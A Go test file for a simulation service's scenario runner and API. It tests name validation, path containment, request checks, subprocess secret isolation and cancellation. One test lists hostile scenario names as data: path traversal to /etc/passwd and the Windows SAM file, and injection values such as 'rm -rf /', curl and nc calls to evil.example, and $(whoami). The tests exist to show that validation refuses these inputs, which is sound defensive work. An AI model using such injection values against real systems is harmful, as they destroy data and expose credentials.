package simulation

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"agentic-assurance/internal/identity"
)

// The scenario name reaches a filesystem and then a process. Everything about that
// path is checked here, because the failure mode is not a wrong answer.

func TestAScenarioNameCannotBecomeAPath(t *testing.T) {
	hostile := []string{
		"../../../etc/passwd",
		"..\\..\\windows\\system32\\config\\sam",
		"/etc/passwd",
		"C:\\Windows\\System32\\drivers\\etc\\hosts",
		"demo/../../../secrets",
		"demo;rm -rf /",
		"demo && curl evil.example",
		"demo\x00.json",
		"demo$(whoami)",
		"demo`id`",
		"demo|nc evil.example 1234",
		"demo\nrm -rf /",
		"a.b",
		".",
		"..",
		"",
		"   ",
		strings.Repeat("a", 65),
	}

	for _, name := range hostile {
		t.Run(strings.ReplaceAll(name, "\x00", "<nul>"), func(t *testing.T) {
			if _, err := ValidateScenarioName(name); err == nil {
				t.Fatalf("%q was accepted as a scenario name. It reaches a filesystem "+
					"and then a process argument vector, and a name that is not a name "+
					"is a request that must be refused rather than sanitised", name)
			}
		})
	}
}

func TestLegitimateScenarioNamesAreAccepted(t *testing.T) {
	for _, name := range []string{"demo", "correlated_panic", "flash-crash", "s12", "A_b-9"} {
		if _, err := ValidateScenarioName(name); err != nil {
			t.Errorf("%q was refused: %v", name, err)
		}
	}
}

// Even a name that somehow passed validation must not resolve outside the scenario
// directory. Two checks, because the first one being right is not something to assume
// about the code path that reaches a filesystem.
func TestResolveStaysInsideTheScenarioDirectory(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "ok.json"), []byte(`{}`), 0o600); err != nil {
		t.Fatalf("fixture: %v", err)
	}
	outside := filepath.Join(t.TempDir(), "secret.json")
	if err := os.WriteFile(outside, []byte(`{}`), 0o600); err != nil {
		t.Fatalf("fixture: %v", err)
	}

	r := &Runner{ScenarioDir: dir}

	path, err := r.ResolveScenario("ok")
	if err != nil {
		t.Fatalf("a scenario in the directory did not resolve: %v", err)
	}
	// Compared after cleaning: the two are the same directory written with different
	// separators on Windows, and a test that failed on that would be testing the
	// path syntax rather than the containment.
	wantDir, _ := filepath.Abs(dir)
	if filepath.Clean(filepath.Dir(path)) != filepath.Clean(wantDir) {
		t.Errorf("resolved to %q, outside %q", path, wantDir)
	}

	if _, err := r.ResolveScenario("../" + filepath.Base(outside)); err == nil {
		t.Error("a traversing name resolved to a file outside the scenario directory")
	}
	if _, err := r.ResolveScenario("nosuch"); err == nil {
		t.Error("a scenario that does not exist resolved anyway")
	}
	if got, err := r.ResolveScenario("demo"); err != nil || got != "demo" {
		t.Errorf("demo = %q, %v; the built-in scenario is passed through", got, err)
	}
}

// A request that could not be reproduced or attributed is refused before anything
// starts.
func TestRequestValidation(t *testing.T) {
	seed := int64(42)
	cases := []struct {
		name    string
		request Request
		wantErr string
	}{
		{
			name:    "complete",
			request: Request{TenantID: "t", Scenario: "demo", Seed: &seed, RequestedBy: "ana"},
		},
		{
			name:    "no seed",
			request: Request{TenantID: "t", Scenario: "demo", RequestedBy: "ana"},
			wantErr: "seed is required",
		},
		{
			name:    "no requester",
			request: Request{TenantID: "t", Scenario: "demo", Seed: &seed},
			wantErr: "requested_by is required",
		},
		{
			name:    "no tenant",
			request: Request{Scenario: "demo", Seed: &seed, RequestedBy: "ana"},
			wantErr: "tenant is required",
		},
		{
			name:    "hostile scenario",
			request: Request{TenantID: "t", Scenario: "../x", Seed: &seed, RequestedBy: "ana"},
			wantErr: "scenario",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := tc.request.Validate()
			if tc.wantErr == "" {
				if err != nil {
					t.Fatalf("a complete request was refused: %v", err)
				}
				return
			}
			if err == nil {
				t.Fatal("an incomplete request was accepted")
			}
			if !strings.Contains(err.Error(), tc.wantErr) {
				t.Errorf("error = %q, want it to mention %q", err, tc.wantErr)
			}
		})
	}
}

// The engine's stderr is stored and returned through an API. An engine in a loop must
// not be able to exhaust this process's memory, because that would turn a broken
// scenario into an outage of the intelligence plane.
func TestEngineOutputIsBounded(t *testing.T) {
	b := &limitedBuffer{limit: 64}
	for range 1000 {
		if _, err := b.Write([]byte(strings.Repeat("x", 100))); err != nil {
			t.Fatalf("write: %v", err)
		}
	}
	if len(b.String()) != 64 {
		t.Errorf("buffered %d bytes, want 64", len(b.String()))
	}
}

const testToken = "sim-token-of-at-least-thirty-two-chars"

// testCredentials issues one credential for tenant_x, so every test that needs an
// authenticated caller uses the same one.
func testCredentials(t *testing.T) *identity.Credentials {
	t.Helper()
	creds, err := identity.ParseCredentials("svc_sim@tenant_x=" + testToken)
	if err != nil {
		t.Fatalf("credentials: %v", err)
	}
	return creds
}

func authed(req *http.Request) *http.Request {
	req.Header.Set("Authorization", "Bearer "+testToken)
	return req
}

// --- the API, against a store-less runner ---

func TestSubmitRefusesWhatItCannotRun(t *testing.T) {
	api := &API{
		Store:       &Store{},
		Runner:      &Runner{ScenarioDir: t.TempDir(), slots: make(chan struct{}, 1)},
		Credentials: testCredentials(t),
	}

	cases := []struct {
		name       string
		credential bool
		body       string
		wantStatus int
	}{
		{"no credential", false, `{"scenario":"demo","seed":1,"requested_by":"ana"}`, http.StatusUnauthorized},
		{"no seed", true, `{"scenario":"demo","requested_by":"ana"}`, http.StatusBadRequest},
		{"misspelled field", true, `{"scenario":"demo","seeed":1,"requested_by":"ana"}`, http.StatusBadRequest},
		{"traversing scenario", true, `{"scenario":"../x","seed":1,"requested_by":"ana"}`, http.StatusBadRequest},
		{"unknown scenario", true, `{"scenario":"nosuch","seed":1,"requested_by":"ana"}`, http.StatusNotFound},
		{"not json", true, `not json`, http.StatusBadRequest},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodPost, "/v1/simulations", strings.NewReader(tc.body))
			if tc.credential {
				authed(req)
			}
			rec := httptest.NewRecorder()

			mux := http.NewServeMux()
			api.Routes(mux)
			mux.ServeHTTP(rec, req)

			if rec.Code != tc.wantStatus {
				t.Errorf("status = %d, want %d: %s", rec.Code, tc.wantStatus, rec.Body.String())
			}
			if rec.Code == http.StatusAccepted {
				t.Error("a request that could not be run was accepted")
			}
		})
	}
}

// A misspelled field is refused rather than defaulted. A caller who wrote "seeed"
// would otherwise get a reproducible run of a seed they did not choose, and every
// retry would return the same wrong answer.
func TestAMisspelledFieldIsRefusedNotDefaulted(t *testing.T) {
	api := &API{Store: &Store{}, Runner: &Runner{ScenarioDir: t.TempDir(), slots: make(chan struct{}, 1)},
		Credentials: testCredentials(t)}
	mux := http.NewServeMux()
	api.Routes(mux)

	req := authed(httptest.NewRequest(http.MethodPost, "/v1/simulations",
		strings.NewReader(`{"scenario":"demo","seed":7,"requested_by":"ana","hurry":true}`)))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	if rec.Code != http.StatusBadRequest {
		t.Errorf("status = %d, want 400; an unknown field was accepted", rec.Code)
	}
}

func TestAnOversizedRequestIsRefused(t *testing.T) {
	api := &API{Store: &Store{}, Runner: &Runner{ScenarioDir: t.TempDir(), slots: make(chan struct{}, 1)},
		Credentials: testCredentials(t)}
	mux := http.NewServeMux()
	api.Routes(mux)

	req := authed(httptest.NewRequest(http.MethodPost, "/v1/simulations",
		strings.NewReader(strings.Repeat("x", MaxRequestBytes+10))))
	rec := httptest.NewRecorder()
	mux.ServeHTTP(rec, req)

	if rec.Code != http.StatusRequestEntityTooLarge {
		t.Errorf("status = %d, want 413", rec.Code)
	}
}

// The engine really runs, against the real Python process, with no database.
//
// Skipped when the interpreter is absent rather than passing vacuously: this is the
// test that proves the argument vector reaches an engine that produces a record.
func TestTheEngineProducesARecord(t *testing.T) {
	python := interpreter(t)

	r := &Runner{
		Python:      python,
		Repo:        repoRoot(t),
		ScenarioDir: filepath.Join(repoRoot(t), "simulator", "scenarios"),
		Timeout:     2 * time.Minute,
	}

	seed := int64(42)
	record, err := r.invoke(context.Background(), Run{Scenario: "demo", Seed: seed})
	if err != nil {
		t.Fatalf("the engine did not produce a record: %v", err)
	}

	fingerprint, _ := record["result_fingerprint"].(string)
	if fingerprint == "" {
		t.Fatal("the record has no fingerprint")
	}
	if record["random_seed"] != float64(seed) {
		t.Errorf("the record's seed is %v, want %d", record["random_seed"], seed)
	}

	// The same seed twice is the same run. This is the property the whole simulation
	// surface rests on, checked through the process boundary rather than in Python.
	again, err := r.invoke(context.Background(), Run{Scenario: "demo", Seed: seed})
	if err != nil {
		t.Fatalf("second run: %v", err)
	}
	if again["result_fingerprint"] != fingerprint {
		t.Errorf("the same scenario and seed produced two fingerprints, %v and %v",
			fingerprint, again["result_fingerprint"])
	}
}

// A scenario file on disk runs, and its bytes are recorded.
func TestAScenarioFileRuns(t *testing.T) {
	python := interpreter(t)

	r := &Runner{
		Python:      python,
		Repo:        repoRoot(t),
		ScenarioDir: filepath.Join(repoRoot(t), "simulator", "scenarios"),
		Timeout:     2 * time.Minute,
	}

	record, err := r.invoke(context.Background(), Run{Scenario: "correlated_panic", Seed: 7})
	if err != nil {
		t.Fatalf("the shipped scenario did not run: %v", err)
	}
	if hash, _ := record["scenario_source_hash"].(string); len(hash) != 64 {
		t.Errorf("scenario_source_hash = %q; a record must say which file was run, "+
			"not only what it was called", record["scenario_source_hash"])
	}
	if record["scenario_id"] != "correlated_panic" {
		t.Errorf("scenario_id = %v", record["scenario_id"])
	}
}

// The engine's environment carries none of the platform's credentials. A subprocess
// has no use for the database or broker secrets, and spec section 35 says they are
// never handed anywhere they are not needed.
func TestTheEngineDoesNotInheritSecrets(t *testing.T) {
	python := interpreter(t)
	t.Setenv("POSTGRES_APP_DSN", "postgres://should-not-reach-the-engine")
	t.Setenv("ALPACA_SECRET_KEY", "should-not-reach-the-engine")

	r := &Runner{
		Python:      python,
		Repo:        repoRoot(t),
		ScenarioDir: filepath.Join(repoRoot(t), "simulator", "scenarios"),
		Timeout:     2 * time.Minute,
	}

	// The engine is asked to print its own environment instead of running, which is
	// the only way to see what it was actually handed.
	out, err := runPython(t, r, "-c",
		"import os,json; print(json.dumps(sorted(os.environ)))")
	if err != nil {
		t.Fatalf("probe: %v", err)
	}

	var names []string
	if err := json.Unmarshal([]byte(out), &names); err != nil {
		t.Fatalf("probe output: %v", err)
	}
	for _, name := range names {
		if name == "POSTGRES_APP_DSN" || name == "ALPACA_SECRET_KEY" {
			t.Errorf("the engine was handed %s; a simulation has no use for it "+
				"(spec section 35)", name)
		}
	}
}

func interpreter(t *testing.T) string {
	t.Helper()

	root := repoRoot(t)
	candidates := []string{
		filepath.Join(root, ".venv", "Scripts", "python.exe"),
		filepath.Join(root, ".venv", "bin", "python"),
	}
	if runtime.GOOS != "windows" {
		candidates = append(candidates, "/usr/bin/python3")
	}
	for _, c := range candidates {
		if info, err := os.Stat(c); err == nil && !info.IsDir() {
			return c
		}
	}
	t.Skip("no project interpreter; run make bootstrap")
	return ""
}

func repoRoot(t *testing.T) string {
	t.Helper()
	dir, err := filepath.Abs(filepath.Join("..", ".."))
	if err != nil {
		t.Fatalf("repo root: %v", err)
	}
	return dir
}

// runPython executes the interpreter with the runner's own environment policy, so a
// probe of that environment is a probe of what a real run gets.
func runPython(t *testing.T, r *Runner, args ...string) (string, error) {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, r.Python, args...)
	cmd.Dir = r.Repo
	cmd.Env = []string{
		"PATH=" + os.Getenv("PATH"),
		"PYTHONHASHSEED=0",
		"PYTHONIOENCODING=utf-8",
	}
	out, err := cmd.Output()
	return strings.TrimSpace(string(out)), err
}

// A cancelled run is terminal and is not a failure. A failure count that included
// cancellations would make the engine look unreliable every time someone changed
// their mind.
func TestCancelledIsTerminalAndNotAFailure(t *testing.T) {
	if !StatusCancelled.Terminal() {
		t.Error("CANCELLED is not terminal; a cancelled run could be moved again")
	}
	if StatusCancelled == StatusFailed {
		t.Error("cancellation and failure are the same status")
	}
	for _, s := range []Status{StatusQueued, StatusRunning} {
		if s.Terminal() {
			t.Errorf("%s is terminal; it is a state a run moves out of", s)
		}
	}
}

// A cancellation with no actor is refused. "Why did this run stop" should have an
// answer six months later (spec section 36).
func TestCancellationNeedsAnActor(t *testing.T) {
	api := &API{Store: &Store{}, Runner: &Runner{
		ScenarioDir: t.TempDir(), slots: make(chan struct{}, 1),
		inFlight: map[string]context.CancelFunc{},
	}, Credentials: testCredentials(t)}
	mux := http.NewServeMux()
	api.Routes(mux)

	for _, body := range []string{``, `{}`, `{"cancelled_by":""}`, `{"cancelled_by":"  "}`} {
		req := authed(httptest.NewRequest(http.MethodPost, "/v1/simulations/sim_1/cancel",
			strings.NewReader(body)))
		rec := httptest.NewRecorder()
		mux.ServeHTTP(rec, req)

		if rec.Code != http.StatusBadRequest {
			t.Errorf("body %q: status = %d, want 400", body, rec.Code)
		}
	}
}

// Killing the engine mid-run really stops the process, and quickly. A cancellation
// that only marked a row would leave the slot held, and the slot is the scarce thing.
func TestCancellingStopsTheEngineProcess(t *testing.T) {
	python := interpreter(t)

	r := &Runner{
		Python:      python,
		Repo:        repoRoot(t),
		ScenarioDir: filepath.Join(repoRoot(t), "simulator", "scenarios"),
		Timeout:     2 * time.Minute,
	}

	ctx, cancel := context.WithCancel(context.Background())

	done := make(chan error, 1)
	go func() {
		// A process that would run far longer than this test is willing to wait.
		_, err := runPythonCtx(ctx, r, "-c", "import time; time.sleep(120)")
		done <- err
	}()

	// Long enough for the interpreter to actually start, short enough that a test
	// that hangs is obviously broken rather than merely slow.
	time.Sleep(500 * time.Millisecond)
	cancel()

	select {
	case err := <-done:
		if err == nil {
			t.Error("a cancelled process exited successfully; it was not stopped")
		}
	case <-time.After(15 * time.Second):
		t.Fatal("the engine was still running 15 seconds after cancellation. The slot " +
			"it holds is the scarce thing, and a cancellation that does not free it " +
			"has not cancelled anything")
	}
}

func runPythonCtx(ctx context.Context, r *Runner, args ...string) (string, error) {
	cmd := exec.CommandContext(ctx, r.Python, args...)
	cmd.Dir = r.Repo
	cmd.Env = []string{"PATH=" + os.Getenv("PATH"), "PYTHONHASHSEED=0"}
	out, err := cmd.Output()
	return string(out), err
}
